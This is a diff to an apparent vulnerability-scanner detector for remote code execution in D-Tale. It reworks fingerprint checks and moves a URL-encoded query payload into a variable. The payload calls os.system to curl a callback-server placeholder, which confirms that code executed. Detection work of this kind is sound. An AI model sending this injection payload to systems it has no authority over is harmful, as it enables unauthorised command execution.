@@ -42,7 +42,8 @@ actions: {
       http_status: 200
       expect_all: {
         conditions: [
-          { body: {} contains: "<title>My App - Load Data</title>" }
+          { body: {} contains: '<link rel="preload" href="/dtale/static/fonts/istok.woff" as="font" type="font/woff" crossorigin>' },
+          { body: {} contains: "<script type=\"text/javascript\" src=\"/dtale/static/dist/base_styles_bundle.js\"></script>" }
         ]
       }
     }
@@ -62,7 +63,6 @@ actions: {
       http_status: 200
       expect_all: {
         conditions: [
-          { body: {} contains: "\"data_id\":" },
           { body: {} contains: "\"success\":" }
         ]
       }
@@ -83,7 +83,7 @@ actions: {
   name: "trigger_code_execution"
   http_request: {
     method: GET
-    uri: "/dtale/chart-data/{{ dataid }}?query=%40pd.core.frame.com.builtins.__import__%28%22os%22%29.system%28%22%22%22curl%20{{ T_CBS_URI }}%20%23%22%22%22%29"
+    uri: "/dtale/chart-data/{{ dataid }}?query={{ payload }}"
     response: {
       http_status: 200
       expect_all: {
@@ -111,6 +111,9 @@ actions: {
 #############
 
 workflows: {
+  variables: [
+    { name: "payload" value: "%40pd.core.frame.com.builtins.__import__%28%22os%22%29.system%28%22%22%22curl%20{{ T_CBS_URI }}%20%23%22%22%22%29" }
+  ]
   condition: REQUIRES_CALLBACK_SERVER
   actions: [
     "fingerprint_dtale",
